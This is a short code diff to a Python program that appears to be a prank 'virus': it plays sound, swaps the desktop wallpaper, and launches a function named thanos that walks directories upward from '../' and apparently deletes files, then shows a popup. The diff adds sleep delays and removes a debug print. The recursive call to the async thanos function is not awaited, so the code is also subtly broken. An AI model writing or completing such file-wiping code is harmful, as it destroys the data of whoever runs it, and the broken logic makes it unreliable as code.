@@ -1,6 +1,7 @@
 import tkinter as tk
 import os
 import asyncio
+import time
 from playsound import playsound
 
 username = os.getlogin()
@@ -46,9 +47,7 @@ async def thanos(dossier):
     for nom_fichier in os.scandir(dossier):
         if nom_fichier.name != 'virus':
             if nom_fichier.is_dir():
-                print('call')
                 thanos(nom_fichier.path)
-                #os.rmdir(nom_fichier.path)
             else:
                 delete = 0
                 try:
@@ -66,8 +65,9 @@ async def main():
     bgSound()
     wallpaper(0)
     task = asyncio.create_task(thanos('../'))
+    await asyncio.sleep(5)
     wallpaper(1)
-
+    await asyncio.sleep(5)
     await task
     wallpaper(2)
     popUp()
